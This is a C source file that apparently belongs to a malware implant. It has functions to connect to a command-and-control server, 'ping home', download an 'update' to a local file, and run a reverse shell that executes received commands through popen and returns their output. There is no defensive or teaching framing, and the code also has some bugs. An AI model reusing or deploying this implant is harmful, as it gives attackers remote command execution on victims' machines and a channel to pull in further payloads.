#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* For sockets */
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

/* For files and file descriptors */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "utils.h"

int connect_cc(char *ip_adrr, int port, int *socket_desc,
	       struct sockaddr_in *server, int isTCP)
{
	if (isTCP) // 1
		(*socket_desc) = socket(AF_INET, SOCK_STREAM, 0);
	else // 0
		(*socket_desc) = socket(AF_INET, SOCK_DGRAM, 0);

	if ((*socket_desc) == ERROR) {
		printf("Error creating socket\n");
		return ERROR;
	}

	if (isTCP)
		server->sin_addr.s_addr = inet_addr(ip_adrr);

	server->sin_family = AF_INET;
	server->sin_port = htons(port);

	if (connect(*socket_desc, (struct sockaddr *)&(*server),
		    sizeof(*server)) < 0) {
		printf("Error connecting\n");
		return ERROR;
	}

	return OK;
}

int ping_home(int *socket_desc)
{
	printf("Asking for nudes\n");
	send(*socket_desc, "send nudes pls", STD_SIZE, 0);
	sleep(1);

	return OK;
}

int download_update(char *ip_addr, int port)
{
	int socket_desc = 0;
	int recv_ = 0;
	int f = 0;
	size_t write_size = 0;
	char buffer[STD_SIZE] = { 0 };
	struct sockaddr_in server;

	if (connect_cc(ip_addr, port, &socket_desc, &server, 1) == ERROR) {
		printf("Error connecting to the server\n");
		return ERROR;
	}

	f = open("tmp_file", O_RDWR | O_CREAT | O_APPEND, S_IRWXU);
	if (f == ERROR) {
		printf("Error opening file\n");
		return ERROR;
	}

	do {
		recv_ = read(socket_desc, buffer, sizeof(buffer));
		write_size = write(f, buffer, sizeof(buffer));
		if ((int) write_size == ERROR)
			printf("Error writing ??\n");

		memset(buffer, 0, sizeof(buffer));
	} while (recv_ > 0);

	close(f);
	close(socket_desc);

	return OK;
}

int reverse_shell(char *ip_addr, int port)
{
	int socket_desc = 0;
	struct sockaddr_in server;
	char command[STD_SIZE] = { 0 };
	char *welcome_message = "Connected to shell\n$ ";
	char *command_output = NULL;

	if (connect_cc(ip_addr, port, &socket_desc, &server, 1) == ERROR) {
		printf("Error connecting to CC server\n");
		return ERROR;
	}

	if (send(socket_desc, welcome_message, strlen(welcome_message), 0) ==
	    ERROR) {
		printf("Error sending output of command\n");
		return ERROR;
	}

	while (strcmp(command, EXIT_COMMAND) != 0) {
		if (recv(socket_desc, command, STD_SIZE, 0) == ERROR) {
			printf("Error receiving command\n");
			return ERROR;
		}

		exec(command, &command_output);

		strcat(command_output, "\n$ ");

		if (send(socket_desc, command_output, strlen(command_output),
			 0) == ERROR) {
			printf("Error sending output of command\n");
			return ERROR;
		}
	}

	return OK;
}

int exec(char *command, char **output)
{
	int i = 0, stream_size = STD_SIZE;
	char buffer = 0;
	FILE *output_file = NULL;

	(*output) = (char *)calloc(STD_SIZE, sizeof(char));
	if (!(*output)) {
		printf("Error allocating memory\n");
		return ERROR;
	}

	output_file = popen(command, "r");
	if (!output_file) {
		printf("Error running command\n");
		free(*output);
		return ERROR;
	}

	i = 0;
	while ((buffer = fgetc(output_file)) != EOF) {
		(*output)[i] = buffer;
		i++;

		if (i == stream_size - 1) {
			stream_size += STD_SIZE;
			(*output) = (char *)realloc(*output,
						    stream_size * sizeof(char));

			if (!(*output)) {
				printf("Error reallocating memory\n");
				return ERROR;
			}
		}
	}

	pclose(output_file);

	return OK;
}
